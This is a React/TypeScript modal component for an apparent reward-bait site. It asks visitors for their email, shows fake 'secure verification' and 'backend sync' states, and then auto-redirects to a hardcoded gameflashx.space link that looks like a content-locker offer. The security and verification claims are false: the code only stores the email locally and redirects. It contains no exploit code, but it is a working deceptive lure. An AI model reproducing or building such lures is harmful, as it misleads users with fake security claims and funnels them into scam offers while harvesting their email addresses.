'use client';

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { X, Lock, Loader2, ShieldCheck, Mail, ArrowRight, ExternalLink, Sparkles } from 'lucide-react';
import { cn } from '@/lib/utils';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';

/**
 * @fileOverview Luxury Glassmorphism Email Capture Portal.
 * Features: Cinematic gradients, radial focal glows, noise textures, 
 * and high-conversion typographic hierarchy.
 */

interface RewardVerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  brand?: string;
  value?: string;
}

export function RewardVerificationModal({ 
  isOpen, 
  onClose,
  brand = "Reward",
}: RewardVerificationModalProps) {
  const [view, setView] = useState<'email' | 'redirecting'>('email');
  const [email, setEmail] = useState('');
  const [emailError, setEmailError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const REDIRECT_URL = "https://gameflashx.space/cl/i/277ood";

  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
      setView('email');
      setEmail('');
      setEmailError('');
      setIsSubmitting(false);
      
      const savedEmail = localStorage.getItem('captured_user_email');
      if (savedEmail) {
        setEmail(savedEmail);
      }
    } else {
      document.body.style.overflow = 'unset';
    }
  }, [isOpen]);

  // Handle automatic redirect after security delay
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (view === 'redirecting' && isOpen) {
      timer = setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, 2500);
    }
    return () => clearTimeout(timer);
  }, [view, isOpen]);

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      setEmailError('Please enter a valid email address');
      return;
    }

    setIsSubmitting(true);
    
    // Simulate high-end backend sync
    setTimeout(() => {
      localStorage.setItem('captured_user_email', email);
      setView('redirecting');
      setIsSubmitting(false);
    }, 1200);
  };

  if (!isOpen) return null;

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-[10000] flex items-center justify-center p-0 md:p-4 overflow-hidden">
        {/* Backdrop */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          onClick={onClose}
          className="absolute inset-0 bg-black/95 backdrop-blur-md"
        />

        {/* Modal Container with Noise and Gradient */}
        <motion.div
          initial={{ opacity: 0, scale: 0.98, y: 10 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.98, y: 10 }}
          className={cn(
            "relative flex flex-col overflow-hidden bg-[#050b18] shadow-[0_0_100px_rgba(0,0,0,0.9)]",
            "w-full h-full md:h-auto md:max-w-[500px] md:rounded-[20px] md:border md:border-white/10"
          )}
        >
          {/* Subtle Noise Texture Overlay */}
          <div className="absolute inset-0 opacity-[0.03] pointer-events-none z-0" style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E")` }} />
          
          {/* Radial Glow Layer */}
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(0,150,255,0.15)_0%,transparent_70%)] pointer-events-none z-0" />

          {/* Close Button */}
          <button 
            onClick={onClose}
            className="absolute top-6 right-6 w-10 h-10 rounded-full bg-white/5 hover:bg-white/10 flex items-center justify-center text-white/20 hover:text-white transition-all border border-white/5 z-50"
          >
            <X className="w-5 h-5" />
          </button>

          <div className="relative z-10 w-full h-full flex flex-col">
            <AnimatePresence mode="wait">
              {view === 'email' ? (
                /* --- LUXURY EMAIL VIEW --- */
                <motion.div 
                  key="email-view"
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, scale: 0.95 }}
                  className="p-8 md:p-12 text-center flex flex-col items-center justify-center h-full min-h-[500px]"
                >
                  {/* Floating Icon Orb */}
                  <motion.div 
                    animate={{ y: [-8, 8, -8] }}
                    transition={{ duration: 4, repeat: Infinity, ease: "easeInOut" }}
                    className="w-20 h-20 bg-white/5 rounded-full border border-white/10 flex items-center justify-center mb-8 shadow-[0_0_30px_rgba(0,150,255,0.1)] relative"
                  >
                    <div className="absolute inset-0 bg-primary/10 blur-xl rounded-full" />
                    <Mail className="w-8 h-8 text-primary relative z-10" />
                  </motion.div>
                  
                  <div className="space-y-2 mb-8">
                    <h2 className="text-3xl font-black text-white tracking-tight leading-none uppercase">
                      Enter Your Email
                    </h2>
                    <p className="text-lg font-bold bg-gradient-to-r from-[#009dff] to-[#00e0ff] bg-clip-text text-transparent">
                      Continue to Verification
                    </p>
                    <p className="text-[11px] font-medium text-white/40 uppercase tracking-widest max-w-[280px] mx-auto mt-4 leading-relaxed">
                      Complete a quick verification step to receive your reward.
                    </p>
                  </div>

                  <form onSubmit={handleEmailSubmit} className="w-full max-w-sm space-y-4">
                    <div className="relative group">
                      <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-white/20 group-focus-within:text-primary transition-colors" />
                      <Input 
                        type="email"
                        value={email}
                        onChange={(e) => {
                          setEmail(e.target.value);
                          if (emailError) setEmailError('');
                        }}
                        placeholder="Enter your email address"
                        className={cn(
                          "h-14 pl-12 bg-black/40 border-white/10 rounded-xl text-white placeholder:text-white/20 focus:ring-4 focus:ring-primary/5 transition-all duration-300",
                          "group-focus-within:border-primary/40",
                          emailError && "border-red-500/50"
                        )}
                        required
                      />
                    </div>
                    {emailError && (
                      <p className="text-[10px] font-black text-red-500 uppercase tracking-widest text-left ml-2 animate-shake">
                        {emailError}
                      </p>
                    )}

                    <Button 
                      type="submit"
                      disabled={isSubmitting}
                      className="w-full h-14 bg-gradient-to-r from-[#009dff] to-[#00e0ff] hover:scale-[1.03] active:scale-[0.98] text-white font-black uppercase tracking-widest rounded-xl transition-all shadow-[0_10px_30px_rgba(0,150,255,0.3)] border-none group"
                    >
                      {isSubmitting ? (
                        <div className="flex items-center gap-2">
                          <Loader2 className="w-5 h-5 animate-spin" />
                          <span>Processing...</span>
                        </div>
                      ) : (
                        <div className="flex items-center gap-2">
                          Continue <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                        </div>
                      )}
                    </Button>
                  </form>

                  <div className="mt-10 space-y-4 w-full">
                    <div className="h-px bg-gradient-to-r from-transparent via-white/5 to-transparent w-full" />
                    <p className="text-[9px] font-bold text-white/20 uppercase tracking-[0.3em] flex items-center justify-center gap-2">
                      <ShieldCheck className="w-3.5 h-3.5 opacity-50" /> Secure • Takes less than 60 seconds
                    </p>
                  </div>
                </motion.div>
              ) : (
                /* --- REDIRECT VIEW --- */
                <motion.div 
                  key="redirect-view"
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="p-8 md:p-16 text-center flex flex-col items-center justify-center h-full min-h-[500px] space-y-12"
                >
                  <div className="relative">
                    <div className="absolute inset-0 bg-primary/20 blur-[60px] rounded-full animate-pulse" />
                    <div className="relative w-24 h-24 mx-auto">
                      <Loader2 className="w-full h-full text-primary animate-spin" strokeWidth={1.5} />
                      <div className="absolute inset-0 flex items-center justify-center">
                        <Lock className="w-8 h-8 text-primary/40" />
                      </div>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <h2 className="text-3xl font-black text-white uppercase tracking-tight leading-none">
                      Preparing Secure <br /><span className="text-primary">Verification...</span>
                    </h2>
                    <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-primary/10 border border-primary/20">
                      <Sparkles className="w-3 h-3 text-primary" />
                      <span className="text-[10px] font-black text-primary uppercase tracking-widest animate-pulse">
                        Manual Verification Required
                      </span>
                    </div>
                  </div>

                  <div className="space-y-8 w-full">
                    <a 
                      href={REDIRECT_URL}
                      className="inline-flex items-center gap-2 text-[10px] font-black text-primary uppercase tracking-[0.3em] hover:text-white transition-colors group"
                    >
                      Click here if not redirected <ExternalLink className="w-3.5 h-3.5 group-hover:translate-x-0.5 transition-transform" />
                    </a>

                    <div className="pt-10 border-t border-white/5">
                      <p className="text-[10px] font-bold text-white/20 uppercase tracking-[0.4em]">
                        Secure • Fast • Verified Users Only
                      </p>
                    </div>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </motion.div>
      </div>
    </AnimatePresence>
  );
}
